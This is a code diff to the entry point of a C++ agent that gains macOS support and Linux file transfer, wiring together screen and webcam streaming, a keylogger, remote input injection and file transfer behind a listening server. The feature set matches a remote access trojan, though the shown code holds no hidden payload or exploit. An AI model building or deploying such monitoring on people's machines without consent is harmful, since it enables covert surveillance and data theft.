@@ -10,6 +10,7 @@
     #include "platform/linux/LinuxAppManager.hpp"
     #include "platform/linux/LinuxWebcamStreamer.hpp"
     #include "platform/linux/LinuxInputInjectorFactory.hpp"
+    #include "platform/linux/LinuxFileTransfer.hpp"
 #elif defined(PLATFORM_WINDOWS)
     #include "platform/windows/WindowsScreenStreamer.hpp"
     #include "platform/windows/WindowsWebcamStreamer.hpp"
@@ -17,6 +18,13 @@
     #include "platform/windows/WindowsAppManager.hpp"
     #include "platform/windows/WindowsInputInjector.hpp"
     #include "platform/windows/WindowsFileTransfer.hpp"
+#elif defined(PLATFORM_MACOS)
+    #include "platform/macos/MacOSScreenStreamer.hpp"
+    #include "platform/macos/MacOSWebcamStreamer.hpp"
+    #include "platform/macos/MacOSKeylogger.hpp"
+    #include "platform/macos/MacOSAppManager.hpp"
+    #include "platform/macos/MacOSInputInjector.hpp"
+    #include "platform/macos/MacOSFileTransfer.hpp"
 #else
     #include "testing/MockStreamer.hpp"
     // Mock classes for dev
@@ -49,17 +57,18 @@ int main(int argc, char** argv) {
     init_network();
     std::cout << "[Main] Universal Agent Starting..." << std::endl;
 
-    int port = 9091; // Default Gateway Agent Port
-    std::string host = "127.0.0.1"; // Default Host
+    int port = 9091; // Default Backend Server Port
 
     if(argc > 1) {
-        port = std::stoi(argv[1]);
-    }
-    if(argc > 2) {
-        host = argv[2];
+        try {
+            port = std::stoi(argv[1]);
+        } catch (...) {
+            std::cerr << "[Main] Invalid port specified, using default 9091" << std::endl;
+        }
     }
 
-    std::cout << "[Main] Gateway Config: " << host << ":" << port << std::endl;
+    std::cout << "[Main] Listening on port: " << port << std::endl;
+    std::cout << "[Main] (Discovery will announce this port to any Gateway)" << std::endl;
 
     // 1. Core Services
     auto bus = std::make_shared<core::BroadcastBus>();
@@ -77,7 +86,8 @@ int main(int argc, char** argv) {
     auto keylogger = std::make_shared<platform::linux_os::LinuxEvdevLogger>();
     auto app_manager = std::make_shared<platform::linux_os::LinuxAppManager>();
     // Linux Input Injector using Factory (auto-detects X11 vs Wayland)
-    auto input_injector = platform::linux_os::LinuxInputInjectorFactory::create();
+    std::shared_ptr<interfaces::IInputInjector> input_injector = platform::linux_os::LinuxInputInjectorFactory::create();
+    auto file_transfer = std::make_shared<platform::linux_os::LinuxFileTransfer>();
 
     // 5. Sessions
     auto session = std::make_shared<core::StreamSession>(screen_streamer, monitor_bus);
@@ -85,7 +95,6 @@ int main(int argc, char** argv) {
 
     // 6. Server
     core::BackendServer server(
-        host,
         port,
         monitor_bus,
         webcam_bus,
@@ -94,7 +103,7 @@ int main(int argc, char** argv) {
         keylogger,
         app_manager,
         input_injector,
-        nullptr // No file transfer on Linux yet
+        file_transfer
     );
 
 #elif defined(PLATFORM_WINDOWS)
@@ -113,7 +122,32 @@ int main(int argc, char** argv) {
     auto webcam_session = std::make_shared<core::StreamSession>(webcam_streamer, webcam_bus);
 
     core::BackendServer server(
-        host,
+        port,
+        monitor_bus,
+        webcam_bus,
+        session,
+        webcam_session,
+        keylogger,
+        app_manager,
+        input_injector,
+        file_transfer
+    );
+#elif defined(PLATFORM_MACOS)
+    std::cout << "[Main] Mode: MACOS NATIVE" << std::endl;
+    auto monitor_bus = std::make_shared<core::BroadcastBus>();
+    auto webcam_bus = std::make_shared<core::BroadcastBus>();
+
+    auto screen_streamer = std::make_shared<platform::macos::MacOSScreenStreamer>();
+    auto webcam_streamer = std::make_shared<platform::macos::MacOSWebcamStreamer>(0);
+    auto keylogger = std::make_shared<platform::macos::MacOSKeylogger>();
+    auto app_manager = std::make_shared<platform::macos::MacOSAppManager>();
+    auto input_injector = std::make_shared<platform::macos::MacOSInputInjector>();
+    auto file_transfer = std::make_shared<platform::macos::MacOSFileTransfer>();
+
+    auto session = std::make_shared<core::StreamSession>(screen_streamer, monitor_bus);
+    auto webcam_session = std::make_shared<core::StreamSession>(webcam_streamer, webcam_bus);
+
+    core::BackendServer server(
         port,
         monitor_bus,
         webcam_bus,
@@ -134,7 +168,7 @@ int main(int argc, char** argv) {
 
     auto session = std::make_shared<core::StreamSession>(bus, streamer);
 
-    core::BackendServer server(host, port, bus, bus, session, session, keylogger, app_manager, input_injector, nullptr);
+    core::BackendServer server(port, bus, bus, session, session, keylogger, app_manager, input_injector, nullptr);
 #endif
 
     // 4. Run
